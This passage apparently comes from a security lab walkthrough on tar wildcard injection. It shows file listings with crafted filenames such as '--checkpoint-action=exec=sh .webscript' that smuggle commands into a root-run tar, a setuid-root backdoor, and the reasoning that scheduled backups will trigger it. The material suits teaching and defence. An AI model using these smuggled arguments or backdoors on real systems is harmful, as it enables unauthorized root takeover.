    -rw-rw-r-- 1 instructor instructor    0 Dec 28 18:41 '--checkpoint=1'
    -rw-rw-r-- 1 instructor instructor    0 Dec 28 18:41 '--checkpoint-action=exec=sh .webscript'
    -rw-rw-r-- 1 instructor instructor  535 Dec 28 18:41  .webscript
    -rw-rw-r-- 1 instructor instructor 3699 Dec 28 18:21  wildpwn.py
    ```

Note the following about this output:

- There is a new directory called `.cache` that we will explore in just a moment. 

- The directory contains two files: `--checkpoint=1` and  `--checkpoint-action=exec=sh .webscript` 

- These are files whose names look like `tar` commands. Normal users would never use such filenames: this is something that only hackers would do.

- The `.webscript` contains the malicious code that was planted by running the `wildpwn.py` program.

What do you think the file `--checkpoint-action=exec=sh .webscript` will do if it’s interpreted as a checkpoint command?

  - When an administrator uses `tar` to create an archive containing this file, it will cause `tar` to run the program `.webscript` as a checkpoint command. Note that the period `.` before `webscript` indicates that it is a hidden file. It can be displayed using the `-a` switch.  

Running `wildpwn.py` has successfully planted all the files needed for an attacker to exploit the system. These malicious files will be executed as soon as an administrator creates a `tar` archive containing them. 

We will next show how this malicious code will get executed when an unsuspecting administrator runs the `tar` command with a wildcard character.

- Move into the new `.cache` directory and list the files located inside.

    ```
    instructor@ubuntu-vm:~/Documents/exploit_demo$ cd .cache
    instructor@ubuntu-vm:~/Documents/exploit_demo.cache$ ls -la
    total 20
    drwxr-xr-x 2 root       root       4096 Jan  3 13:54 .
    drwxr-xr-x 8 instructor instructor 4096 Jan  6 10:50 ..
    -rwsr-xr-x 1 root       root       8392 Jan  3 13:54 .cachefile
    ```
There is just one file located here, called `.cachefile`, and that it is executable.

- Run: `./.cachefile` to execute it.

We now have root access. 

- The `.cachefile` that we ran was owned by `root`, which is why running the script is able to give us root privileges.

- The reason the `.cachefile` is owned by the root user is because we ran the archive command with `sudo tar...` not just `tar...`. If we didn't prefix the command with `sudo`, the `.cachefile` wouldn't do anything (specifically, it would change our user to instructor instead of `root`, which is useless to a hacker).

* In practice, an administrator would not manually run `sudo tar ...` to back up a directory. 

    - Instead, the system would run an automated backup on a set schedule, such as every Friday, and would do so with full root privileges. This is because it needs to archive files belonging to every user, and the only user who has permissions to modify everyone's files is `root`.

* This is great for the hacker: 
    - We can trust that a good system administrator will have scheduled regular backups, so it's likely that this malicious data will get included in a backup. 

    - The hacker will then just have to wait until this happens, and they'll have a backdoor to `root`.
